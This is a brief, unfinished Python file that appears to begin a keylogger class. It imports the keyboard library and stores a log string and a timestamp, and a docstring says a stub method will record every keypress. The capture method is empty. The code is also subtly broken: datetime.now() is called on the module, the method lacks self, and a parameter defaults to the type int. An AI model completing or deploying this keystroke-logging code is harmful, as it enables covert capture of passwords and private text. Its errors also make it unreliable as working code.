import keyboard
import datetime

class Keylogger:
    def __init__(self, definedIntervalTime = int):
        """
        This function set a empty string and the actual date
        for every individual string in a certain period of time

        """
        self.definedIntervalTime = definedIntervalTime
        self.logText = ""
        self.date = datetime.now()


    def record_log():
        """
        This function will read each keypressed and register it
        on a string
        """
        pass